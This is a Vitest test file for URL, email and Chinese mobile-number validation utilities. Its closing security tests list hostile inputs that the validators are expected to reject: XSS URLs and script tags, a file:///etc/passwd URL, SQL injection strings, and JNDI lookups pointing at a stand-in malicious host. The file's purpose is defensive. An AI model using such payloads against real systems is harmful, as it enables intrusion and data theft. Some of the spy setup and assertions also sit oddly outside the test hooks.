import { describe, it, expect } from 'vitest'
import { startConsoleMonitoring, stopConsoleMonitoring, expectNoConsoleErrors } from '../../setup/console-monitoring';
import { vi } from 'vitest'
import {
  isExternal,
  validateURL,
  validateEmail,
  validatePhone
} from '@/utils/validate'

// 控制台错误检测变量
let consoleSpy: any

describe('Validate Utils', () => {
    beforeEach(() => {
      startConsoleMonitoring()
      vi.clearAllMocks()
    })
  // 控制台错误检测
  consoleSpy = vi.spyOn(console, 'error').mockImplementation(() => {})

    afterEach(() => {
      expectNoConsoleErrors()
      stopConsoleMonitoring()
    })
  // 验证控制台错误
  expect(consoleSpy).not.toHaveBeenCalled()
  consoleSpy.mockRestore()
  describe('isExternal', () => {
    it('should return true for https URLs', () => {
      expect(isExternal('https://example.com')).toBe(true)
      expect(isExternal('https://www.example.com')).toBe(true)
      expect(isExternal('https://subdomain.example.com')).toBe(true)
      expect(isExternal('https://example.com/path')).toBe(true)
      expect(isExternal('https://example.com?query=value')).toBe(true)
      expect(isExternal('https://example.com#fragment')).toBe(true)
    })

    it('should return true for http URLs', () => {
      expect(isExternal('http://example.com')).toBe(true)
      expect(isExternal('http://www.example.com')).toBe(true)
      expect(isExternal('http://example.com/path')).toBe(true)
    })

    it('should return true for mailto URLs', () => {
      expect(isExternal('mailto:user@example.com')).toBe(true)
      expect(isExternal('mailto:support@company.com')).toBe(true)
      expect(isExternal('mailto:info@example.org')).toBe(true)
    })

    it('should return true for tel URLs', () => {
      expect(isExternal('tel:+1234567890')).toBe(true)
      expect(isExternal('tel:123-456-7890')).toBe(true)
      expect(isExternal('tel:+1-800-555-1234')).toBe(true)
    })

    it('should return false for internal paths', () => {
      expect(isExternal('/dashboard')).toBe(false)
      expect(isExternal('/users')).toBe(false)
      expect(isExternal('/settings/profile')).toBe(false)
      expect(isExternal('dashboard')).toBe(false)
      expect(isExternal('users')).toBe(false)
      expect(isExternal('../relative/path')).toBe(false)
      expect(isExternal('./current/path')).toBe(false)
    })

    it('should return false for relative URLs with protocols', () => {
      expect(isExternal('//example.com')).toBe(false)
      expect(isExternal('//www.example.com')).toBe(false)
    })

    it('should handle edge cases', () => {
      expect(isExternal('')).toBe(false)
      expect(isExternal(' ')).toBe(false)
      expect(isExternal('https://')).toBe(true) // Still starts with https:
      expect(isExternal('http://')).toBe(true) // Still starts with http:
      expect(isExternal('mailto:')).toBe(true) // Still starts with mailto:
      expect(isExternal('tel:')).toBe(true) // Still starts with tel:
    })

    it('should be case insensitive for protocols', () => {
      expect(isExternal('HTTPS://example.com')).toBe(true)
      expect(isExternal('HTTP://example.com')).toBe(true)
      expect(isExternal('MAILTO:user@example.com')).toBe(true)
      expect(isExternal('TEL:+1234567890')).toBe(true)
    })
  })

  describe('validateURL', () => {
    it('should return true for valid HTTP URLs', () => {
      expect(validateURL('http://example.com')).toBe(true)
      expect(validateURL('https://example.com')).toBe(true)
      expect(validateURL('http://www.example.com')).toBe(true)
      expect(validateURL('https://www.example.com')).toBe(true)
      expect(validateURL('http://subdomain.example.com')).toBe(true)
      expect(validateURL('https://subdomain.example.com')).toBe(true)
    })

    it('should return true for valid URLs with paths', () => {
      expect(validateURL('http://example.com/path')).toBe(true)
      expect(validateURL('https://example.com/path/to/resource')).toBe(true)
      expect(validateURL('http://example.com/path/file.html')).toBe(true)
      expect(validateURL('https://example.com/path/file.php')).toBe(true)
    })

    it('should return true for valid URLs with query parameters', () => {
      expect(validateURL('http://example.com?param=value')).toBe(true)
      expect(validateURL('https://example.com?param1=value1&param2=value2')).toBe(true)
      expect(validateURL('http://example.com/path?param=value')).toBe(true)
    })

    it('should return true for valid URLs with fragments', () => {
      expect(validateURL('http://example.com#section')).toBe(true)
      expect(validateURL('https://example.com/path#section')).toBe(true)
      expect(validateURL('http://example.com?param=value#section')).toBe(true)
    })

    it('should return true for valid URLs with ports', () => {
      expect(validateURL('http://example.com:80')).toBe(true)
      expect(validateURL('https://example.com:443')).toBe(true)
      expect(validateURL('http://example.com:8080')).toBe(true)
      expect(validateURL('https://example.com:8443')).toBe(true)
    })

    it('should return true for valid URLs with authentication', () => {
      expect(validateURL('http://user:pass@example.com')).toBe(true)
      expect(validateURL('https://user:pass@example.com')).toBe(true)
      expect(validateURL('http://user@example.com')).toBe(true)
    })

    it('should return true for valid URLs with complex TLDs', () => {
      expect(validateURL('http://example.co.uk')).toBe(true)
      expect(validateURL('https://example.org')).toBe(true)
      expect(validateURL('http://example.edu')).toBe(true)
      expect(validateURL('https://example.gov')).toBe(true)
      expect(validateURL('http://example.io')).toBe(true)
      expect(validateURL('https://example.ai')).toBe(true)
    })

    it('should return false for invalid URLs', () => {
      expect(validateURL('example.com')).toBe(false) // Missing protocol
      expect(validateURL('www.example.com')).toBe(false) // Missing protocol
      expect(validateURL('http://')).toBe(false) // Missing domain
      expect(validateURL('https://')).toBe(false) // Missing domain
      expect(validateURL('http://.com')).toBe(false) // Invalid domain
      expect(validateURL('https://.')).toBe(false) // Invalid domain
      expect(validateURL('http://example..com')).toBe(false) // Double dots
      expect(validateURL('https://example.com/path/')).toBe(true) // Trailing slash is valid
    })

    it('should return false for URLs with invalid characters', () => {
      expect(validateURL('http://example.com/space in path')).toBe(false)
      expect(validateURL('https://example.com/invalid|char')).toBe(false)
      expect(validateURL('http://example.com/invalid\\char')).toBe(false)
    })

    it('should return false for non-HTTP protocols', () => {
      expect(validateURL('ftp://example.com')).toBe(false)
      expect(validateURL('file:///path/to/file')).toBe(false)
      expect(validateURL('javascript:alert(1)')).toBe(false)
      expect(validateURL('data:text/plain;base64,SGVsbG8gV29ybGQ=')).toBe(false)
      expect(validateURL('mailto:user@example.com')).toBe(false)
      expect(validateURL('tel:+1234567890')).toBe(false)
    })

    it('should handle edge cases', () => {
      expect(validateURL('')).toBe(false)
      expect(validateURL(' ')).toBe(false)
      expect(validateURL('http://')).toBe(false)
      expect(validateURL('https://')).toBe(false)
      expect(validateURL('http:// ')).toBe(false)
      expect(validateURL('https:// ')).toBe(false)
    })

    it('should handle IP addresses', () => {
      expect(validateURL('http://192.168.1.1')).toBe(true)
      expect(validateURL('https://192.168.1.1')).toBe(true)
      expect(validateURL('http://127.0.0.1')).toBe(true)
      expect(validateURL('https://127.0.0.1')).toBe(true)
      expect(validateURL('http://0.0.0.0')).toBe(true)
      expect(validateURL('https://0.0.0.0')).toBe(true)
    })

    it('should handle localhost', () => {
      expect(validateURL('http://localhost')).toBe(true)
      expect(validateURL('https://localhost')).toBe(true)
      expect(validateURL('http://localhost:3000')).toBe(true)
      expect(validateURL('https://localhost:8443')).toBe(true)
    })
  })

  describe('validateEmail', () => {
    it('should return true for valid email addresses', () => {
      expect(validateEmail('user@example.com')).toBe(true)
      expect(validateEmail('user.name@example.com')).toBe(true)
      expect(validateEmail('user+tag@example.com')).toBe(true)
      expect(validateEmail('user_name@example.com')).toBe(true)
      expect(validateEmail('123user@example.com')).toBe(true)
      expect(validateEmail('user123@example.com')).toBe(true)
      expect(validateEmail('user@subdomain.example.com')).toBe(true)
      expect(validateEmail('user@sub.subdomain.example.com')).toBe(true)
    })

    it('should return true for emails with different TLDs', () => {
      expect(validateEmail('user@example.co.uk')).toBe(true)
      expect(validateEmail('user@example.org')).toBe(true)
      expect(validateEmail('user@example.edu')).toBe(true)
      expect(validateEmail('user@example.gov')).toBe(true)
      expect(validateEmail('user@example.io')).toBe(true)
      expect(validateEmail('user@example.ai')).toBe(true)
      expect(validateEmail('user@example.museum')).toBe(true)
    })

    it('should return true for emails with numbers in domain', () => {
      expect(validateEmail('user@example123.com')).toBe(true)
      expect(validateEmail('user@123example.com')).toBe(true)
      expect(validateEmail('user@sub123.example.com')).toBe(true)
    })

    it('should return false for invalid email addresses', () => {
      expect(validateEmail('invalid-email')).toBe(false) // Missing @ and domain
      expect(validateEmail('@example.com')).toBe(false) // Missing local part
      expect(validateEmail('user@')).toBe(false) // Missing domain
      expect(validateEmail('user@.com')).toBe(false) // Invalid domain
      expect(validateEmail('user..name@example.com')).toBe(false) // Double dots
      expect(validateEmail('user.@example.com')).toBe(false) // Dot at end
      expect(validateEmail('.user@example.com')).toBe(false) // Dot at start
      expect(validateEmail('user@-example.com')).toBe(false) // Hyphen at start
      expect(validateEmail('user@example-.com')).toBe(false) // Hyphen at end
    })

    it('should return false for emails with invalid characters', () => {
      expect(validateEmail('user name@example.com')).toBe(false) // Space in local part
      expect(validateEmail('user@name space.com')).toBe(false) // Space in domain
      expect(validateEmail('user|name@example.com')).toBe(false) // Invalid character
      expect(validateEmail('user\\name@example.com')).toBe(false) // Invalid character
      expect(validateEmail('user/name@example.com')).toBe(false) // Invalid character
    })

    it('should return false for emails with multiple @ symbols', () => {
      expect(validateEmail('user@name@example.com')).toBe(false)
      expect(validateEmail('user@@example.com')).toBe(false)
      expect(validateEmail('@user@example.com')).toBe(false)
    })

    it('should handle edge cases', () => {
      expect(validateEmail('')).toBe(false)
      expect(validateEmail(' ')).toBe(false)
      expect(validateEmail('@')).toBe(false)
      expect(validateEmail(' @ ')).toBe(false)
      expect(validateEmail('user@')).toBe(false)
      expect(validateEmail('@example')).toBe(false)
    })

    it('should handle unusually long emails', () => {
      const longLocalPart = 'a'.repeat(64) + '@example.com'
      expect(validateEmail(longLocalPart)).toBe(true)
      
      const veryLongLocalPart = 'a'.repeat(65) + '@example.com'
      expect(validateEmail(veryLongLocalPart)).toBe(false)
    })

    it('should handle quoted local parts', () => {
      expect(validateEmail('"user name"@example.com')).toBe(true)
      expect(validateEmail('"user@name"@example.com')).toBe(true)
      expect(validateEmail('"user\\"name"@example.com')).toBe(true)
    })
  })

  describe('validatePhone', () => {
    it('should return true for valid Chinese mobile phone numbers', () => {
      expect(validatePhone('13800138000')).toBe(true)
      expect(validatePhone('13912345678')).toBe(true)
      expect(validatePhone('15098765432')).toBe(true)
      expect(validatePhone('18888888888')).toBe(true)
      expect(validatePhone('19999999999')).toBe(true)
    })

    it('should return true for all valid Chinese mobile prefixes', () => {
      const validPrefixes = ['130', '131', '132', '133', '134', '135', '136', '137', '138', '139',
                             '150', '151', '152', '153', '155', '156', '157', '158', '159',
                             '180', '181', '182', '183', '184', '185', '186', '187', '188', '189',
                             '190', '191', '192', '193', '195', '196', '197', '198', '199']
      
      validPrefixes.forEach(prefix => {
        const phoneNumber = prefix + '12345678'
        expect(validatePhone(phoneNumber)).toBe(true)
      })
    })

    it('should return false for invalid phone numbers', () => {
      expect(validatePhone('1234567890')).toBe(false) // Invalid prefix
      expect(validatePhone('123456789')).toBe(false) // Too short
      expect(validatePhone('123456789012')).toBe(false) // Too long
      expect(validatePhone('1234567890a')).toBe(false) // Contains letter
      expect(validatePhone('abcdefghij')).toBe(false) // All letters
      expect(validatePhone('123-456-7890')).toBe(false) // Contains hyphens
      expect(validatePhone('(123) 456-7890')).toBe(false) // Contains parentheses
      expect(validatePhone('+86 138 0013 8000')).toBe(false) // Contains spaces and plus
    })

    it('should return false for phone numbers with invalid characters', () => {
      expect(validatePhone('1380013800!')).toBe(false)
      expect(validatePhone('1380013800@')).toBe(false)
      expect(validatePhone('1380013800#')).toBe(false)
      expect(validatePhone('1380013800$')).toBe(false)
      expect(validatePhone('1380013800%')).toBe(false)
    })

    it('should return false for phone numbers starting with 1 but wrong length', () => {
      expect(validatePhone('1')).toBe(false)
      expect(validatePhone('12')).toBe(false)
      expect(validatePhone('123')).toBe(false)
      expect(validatePhone('1234')).toBe(false)
      expect(validatePhone('12345')).toBe(false)
      expect(validatePhone('123456')).toBe(false)
      expect(validatePhone('1234567')).toBe(false)
      expect(validatePhone('12345678')).toBe(false)
      expect(validatePhone('123456789')).toBe(false)
      expect(validatePhone('12345678901')).toBe(false)
      expect(validatePhone('123456789012')).toBe(false)
    })

    it('should return false for phone numbers not starting with 1', () => {
      expect(validatePhone('23800138000')).toBe(false)
      expect(validatePhone('33800138000')).toBe(false)
      expect(validatePhone('43800138000')).toBe(false)
      expect(validatePhone('53800138000')).toBe(false)
      expect(validatePhone('63800138000')).toBe(false)
      expect(validatePhone('73800138000')).toBe(false)
      expect(validatePhone('83800138000')).toBe(false)
      expect(validatePhone('93800138000')).toBe(false)
      expect(validatePhone('03800138000')).toBe(false)
    })

    it('should handle edge cases', () => {
      expect(validatePhone('')).toBe(false)
      expect(validatePhone(' ')).toBe(false)
      expect(validatePhone('1')).toBe(false)
      expect(validatePhone('11111111111')).toBe(false) // All 1s
      expect(validatePhone('00000000000')).toBe(false) // All 0s
    })

    it('should handle whitespace', () => {
      expect(validatePhone(' 13800138000')).toBe(false)
      expect(validatePhone('13800138000 ')).toBe(false)
      expect(validatePhone(' 13800138000 ')).toBe(false)
      expect(validatePhone('138 0013 8000')).toBe(false)
      expect(validatePhone('138-0013-8000')).toBe(false)
    })
  })

  describe('Integration Tests', () => {
    it('should work together for complex validation scenarios', () => {
      const testCases = [
        {
          url: 'https://example.com',
          email: 'user@example.com',
          phone: '13800138000',
          expected: { url: true, email: true, phone: true }
        },
        {
          url: 'http://localhost:3000',
          email: 'admin@localhost',
          phone: '13912345678',
          expected: { url: true, email: true, phone: true }
        },
        {
          url: 'invalid-url',
          email: 'invalid-email',
          phone: '123456789',
          expected: { url: false, email: false, phone: false }
        }
      ]

      testCases.forEach(({ url, email, phone, expected }) => {
        expect(validateURL(url)).toBe(expected.url)
        expect(validateEmail(email)).toBe(expected.email)
        expect(validatePhone(phone)).toBe(expected.phone)
      })
    })

    it('should handle validation for user profile data', () => {
      const userProfile = {
        website: 'https://johndoe.com',
        email: 'john.doe@example.com',
        phone: '13800138000',
        github: 'https://github.com/johndoe',
        linkedin: 'https://linkedin.com/in/johndoe'
      }

      expect(validateURL(userProfile.website)).toBe(true)
      expect(validateEmail(userProfile.email)).toBe(true)
      expect(validatePhone(userProfile.phone)).toBe(true)
      expect(validateURL(userProfile.github)).toBe(true)
      expect(validateURL(userProfile.linkedin)).toBe(true)
    })

    it('should validate external links correctly', () => {
      const links = [
        'https://example.com',
        'http://example.org',
        'mailto:user@example.com',
        'tel:+1234567890',
        '/internal/page',
        '/dashboard',
        'relative/path'
      ]

      links.forEach(link => {
        const isExternalLink = isExternal(link)
        if (link.startsWith('http') || link.startsWith('mailto') || link.startsWith('tel')) {
          expect(isExternalLink).toBe(true)
        } else {
          expect(isExternalLink).toBe(false)
        }
      })
    })
  })

  describe('Performance Tests', () => {
    it('should handle large numbers of validations efficiently', () => {
      const emails = Array(1000).fill(null).map((_, i) => `user${i}@example.com`)
      const phones = Array(1000).fill(null).map((_, i) => `138${String(i).padStart(8, '0')}`)
      const urls = Array(1000).fill(null).map((_, i) => `https://example${i}.com`)

      const startTime = performance.now()

      emails.forEach(email => validateEmail(email))
      phones.forEach(phone => validatePhone(phone))
      urls.forEach(url => validateURL(url))

      const endTime = performance.now()
      const duration = endTime - startTime

      expect(duration).toBeLessThan(1000) // Should complete in under 1 second
    })

    it('should handle complex URLs efficiently', () => {
      const complexUrls = [
        'https://subdomain.example.com:8080/path/to/resource?param1=value1&param2=value2#section',
        'http://user:pass@example.com/path/file.html?query=value#fragment',
        'https://192.168.1.1:8443/api/v1/users?page=1&limit=10',
        'http://localhost:3000/dashboard/settings?theme=dark&lang=en'
      ]

      const startTime = performance.now()

      complexUrls.forEach(url => {
        expect(validateURL(url)).toBe(true)
        expect(isExternal(url)).toBe(true)
      })

      const endTime = performance.now()
      const duration = endTime - startTime

      expect(duration).toBeLessThan(10) // Should be very fast
    })
  })

  describe('Security Tests', () => {
    it('should reject potentially malicious URLs', () => {
      const maliciousUrls = [
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'vbscript:alert(1)',
        'file:///etc/passwd',
        'ftp://malicious.com',
        'irc://malicious.com',
        'about:blank',
        'chrome://settings',
        'edge://settings',
        'moz-extension://some-extension-id/'
      ]

      maliciousUrls.forEach(url => {
        expect(validateURL(url)).toBe(false)
        expect(isExternal(url)).toBe(url.startsWith('mailto:') || url.startsWith('tel:'))
      })
    })

    it('should handle email injection attempts', () => {
      const maliciousEmails = [
        'user@example.com<script>alert(1)</script>',
        'user@example.com" onclick="alert(1)"',
        'user@example.com\' OR \'1\'=\'1',
        'user@example.com; DROP TABLE users;',
        'user@example.com${jndi:ldap://malicious.com}'
      ]

      maliciousEmails.forEach(email => {
        expect(validateEmail(email)).toBe(false)
      })
    })

    it('should handle phone number injection attempts', () => {
      const maliciousPhones = [
        '13800138000<script>alert(1)</script>',
        '13800138000\' OR \'1\'=\'1',
        '13800138000; DROP TABLE users;',
        '13800138000${jndi:ldap://malicious.com}',
        '13800138000+1-1-UNION SELECT * FROM users'
      ]

      maliciousPhones.forEach(phone => {
        expect(validatePhone(phone)).toBe(false)
      })
    })

    it('should handle very long inputs to prevent DoS', () => {
      const veryLongString = 'a'.repeat(10000)
      
      expect(validateEmail(veryLongString + '@example.com')).toBe(false)
      expect(validatePhone('1' + veryLongString)).toBe(false)
      expect(validateURL('https://' + veryLongString + '.com')).toBe(false)
    })
  })
})